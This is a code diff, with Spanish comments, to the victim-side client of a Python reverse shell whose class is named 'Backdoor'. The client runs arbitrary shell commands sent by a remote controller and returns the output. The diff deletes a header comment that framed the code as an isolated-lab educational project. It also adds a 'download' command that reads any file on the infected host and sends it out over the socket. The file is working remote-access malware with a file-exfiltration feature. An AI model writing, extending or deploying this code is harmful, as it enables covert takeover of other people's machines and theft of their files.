@@ -1,11 +1,4 @@
 #!/usr/bin/env python3
-# =============================================================================
-# REVERSE SHELL - LADO DE LA VÍCTIMA
-# PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
-# ADVERTENCIA: Solo usar en laboratorio aislado propio
-# COMPATIBILIDAD: Windows + Linux
-# =============================================================================
-
 import socket, subprocess, sys, os
 
 class Backdoor:
@@ -20,16 +13,34 @@ class Backdoor:
     def ejecutarComando(self, command):
         try:
             command_str = command.decode('utf-8', errors='ignore').strip()
-            return subprocess.check_output(command_str, shell=True, stderr=subprocess.STDOUT)
+            return subprocess.check_output(
+                command_str, 
+                shell=True, 
+                stderr=subprocess.STDOUT,
+                cwd=self.current_dir  # ← CAMBIO 1: AGREGAR ESTO
+            )
         except Exception as e:
-            # ← ✅ Si falla, devolver el error en vez de crashear
-            return subprocess.check_output(command_str, shell=True, stderr=subprocess.STDOUT, cwd=self.current_dir)  # ← 3️⃣ EJECUTAR EN ESE DIRECTORIO
+            return str(e).encode('utf-8')
     
-    def cambiarDirectorio(self, path):  # ← 4️⃣ FUNCIÓN PARA CAMBIAR
+    def cambiarDirectorio(self, path):
         try:
             os.chdir(path)
             self.current_dir = os.getcwd()
             return f"[+] Directorio cambiado a: {self.current_dir}".encode()
+        except Exception as e:
+            return f"[!] Error: {str(e)}".encode()
+    
+    # ← CAMBIO 2: NUEVA FUNCIÓN
+    def downloadArchivo(self, path):
+        try:
+            if os.path.exists(path):
+                with open(path, 'rb') as f:
+                    contenido = f.read()
+                self.connection.send(b"[+] Archivo enviado\n")
+                self.connection.send(contenido)
+                return None
+            else:
+                return f"[!] Error: Archivo no existe: {path}".encode()
         except Exception as e:
             return f"[!] Error: {str(e)}".encode()
 
@@ -38,17 +49,23 @@ class Backdoor:
             command = self.connection.recv(1024000)
             command_str = command.decode('utf-8', errors='ignore').strip()
             
-            # ← ✅ CHECK "salir" ANTES DE EJECUTAR
             if command_str == "salir":
                 self.connection.close()
                 exit()
 
-            # ← 5️⃣ DETECTAR "cd"
             elif command_str.startswith("cd "):
                 path = command_str[3:].strip()
                 resultado = self.cambiarDirectorio(path)
                 self.connection.send(resultado)
-                continue             
+                continue
+            
+            # ← CAMBIO 3: NUEVO CHECK
+            elif command_str.startswith("download "):
+                path = command_str[9:].strip()
+                resultado = self.downloadArchivo(path)
+                if resultado:
+                    self.connection.send(resultado)
+                continue
             
             resultadosComando = self.ejecutarComando(command)
             self.connection.send(resultadosComando)
